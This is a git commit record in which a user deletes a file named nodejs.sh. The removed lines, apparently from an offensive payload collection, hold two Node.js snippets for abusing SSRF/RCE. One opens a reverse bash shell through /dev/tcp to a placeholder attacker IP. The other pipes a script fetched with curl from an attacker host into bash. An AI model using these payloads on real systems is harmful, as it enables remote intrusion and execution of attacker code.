6c46cfe7b07ef68cafa7271734688f9c19c9d993
Q <155090912+QOLT45EXE@users.noreply.github.com>
2025-04-05 10:26:34 -0700

    Delete nodejs.sh

--- nodejs.sh
+++
@@ -1,7 +0,0 @@
-# Server runs Node? Abusing SSRF/RCE in JS?
-# Local Shell
-require('child_process').exec('bash -i >& /dev/tcp/<attacker_ip>/<port> 0>&1')
-# 
-(() => {
-  require('child_process').exec('curl http://<attacker_ip>/s.sh | bash');
-})();
